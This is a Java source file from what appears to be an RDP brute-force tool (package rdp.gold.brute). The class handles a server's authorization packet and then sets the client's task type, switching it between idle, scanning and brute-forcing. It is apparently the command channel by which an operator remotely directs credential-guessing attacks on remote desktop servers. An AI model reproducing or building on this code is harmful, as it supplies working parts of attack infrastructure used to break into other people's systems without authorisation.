package rdp.gold.brute.synchronizer.packages.read;

import java.util.Map;
import java.util.Scanner;

import org.apache.log4j.Logger;

import rdp.gold.brute.Config;
import rdp.gold.brute.synchronizer.SynchronizerInfo;
import rdp.gold.brute.synchronizer.packages.AbstractPackage;

public class ServerAuthorizationPackage extends AbstractPackage implements rdp.gold.brute.synchronizer.packages.ReadPackage {
    private final Logger logger = Logger.getLogger(getClass());

    public ServerAuthorizationPackage(SynchronizerInfo synchronizerInfoObject) {
        super(synchronizerInfoObject, "ServerAuthorizationPackage");
    }

    @SuppressWarnings("resource")
    public void processPacket(byte[] packet) throws Exception {
        Map<String, Object> packetMap = parsePacket(packet);

        Scanner packetAuthorization = new Scanner(new String((byte[]) packetMap.get("PACKET"))).useDelimiter(";");

        if (packetAuthorization.next().equals("Authenticated")) {
            this.logger.info("Authenticated");
        } else {
            throw new Exception("Not authenticated brute");
        }

        String globalStatus = packetAuthorization.next();
        this.logger.info("Read status: " + globalStatus);

        int taskType = packetAuthorization.nextInt();
        if (taskType == 0) {
            Config.IS_ENABLED_BRUTE.set(false);
            Config.IS_ENABLED_SCAN.set(false);
        } else if (taskType == 1) {
            Config.IS_ENABLED_BRUTE.set(false);
            Config.IS_ENABLED_SCAN.set(true);
        } else if (taskType == 2) {
            Config.IS_ENABLED_BRUTE.set(true);
            Config.IS_ENABLED_SCAN.set(false);
        }

        if (!Config.hasTaskType(taskType)) {
            throw new RuntimeException("Incorrect server send type task: " + taskType);
        }

        Config.TYPE_TASK.set(taskType);

        this.logger.info("Task type: " + Config.TYPE_TASK.get());
    }

    public Class<?> getAwaitPackage() {
        return null;
    }

    public Class<?> getWritePackage() {
        return rdp.gold.brute.synchronizer.packages.write.BruteInfoPackage.class;
    }
}
